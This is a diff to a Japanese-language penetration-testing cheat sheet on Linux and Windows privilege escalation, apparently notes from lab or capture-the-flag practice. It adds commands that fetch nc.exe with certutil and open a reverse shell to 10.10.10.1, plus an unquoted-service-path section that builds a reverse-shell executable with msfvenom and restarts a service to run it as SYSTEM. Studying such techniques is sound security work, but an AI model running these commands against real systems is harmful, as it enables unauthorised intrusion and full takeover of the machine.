@@ -1392,7 +1392,7 @@ ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行
 
 
 ### その他テクニック
-#### Path Injection
+#### Path Variable
 sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)にcurlやgzipやpsコマンドなどがフルパスなしで記述され実行されている場合、自分が用意したコマンド(/bin/shやreverse shellスクリプト)などを実行させるようにパスを書き換える。  
 スクリプト実行時にroot権限でreverse shellが得られる。
 ```
@@ -1504,6 +1504,15 @@ https://github.com/jondonas/linux-exploit-suggester-2
 ### チェック項目
 []
 
+### nc.exe reverse_shell
+```
+rlwrap nc -lvnp 4444
+```
+```
+certutil.exe -urlcache -split -f "http://10.10.10.1/nc.exe" C:\Windows\Temp\nc.exe
+C:Windows\Temp\nc.exe -e cmd 10.10.10.1 4444
+```
+
 ### ファイルのダウンロード
 ```
 curl http://10.10.10.1:9000/putty.exe -o putty.exe
@@ -1552,7 +1561,7 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
 
 ### metasploit(local_exploit_suggester)
-exploitをせずに脆弱性をチェックするために使用するモジュール。
+exploitをせずに脆弱性をチェックするために使用するモジュール。  
 meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。
 
 ```
@@ -1570,6 +1579,34 @@ pip install xlrd
 systeminfo > systeminfo.txt
 ./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
 ```
+
+### Unquoted Service Path
+サービスに使用される実行可能ファイルへのパスが引用符で囲まれていない場合に現れる脆弱性。  
+ここで権限昇格に使用するサービス名は<AdvancedSystemcareservice9>とする。  
+この脆弱性を悪用する方法は、悪意のある実行可能ファイルをサービスパスのどこかに配置し、サービスパスの次のディレクトリの最初の数文字で始まる名前を付ける。  
+サービスが開始(再起動)されると、悪意のあるバイナリ(reverse shell)が実行され、シェルを取得できる。
+```
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+例)AdvancedSystemCareService9  C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+```
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=9001 -f exe > Advanced.exe
+rlwrap nc -lvnp 9001
+```
+```
+certutil -urlcache -split -f "http://10.10.10.1/Advanced.exe"
+sc stop AdvancedSystemcareservice9
+sc start AdvancedSystemcareservice9
+```
+
+
+### Weak Registry Permissions
+### DLL Hijacking
+### Weak Services Permissions
+### Executable Installer File Permissions Weakness
+
+
 
 ### evlilwinrm(5985)
 WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
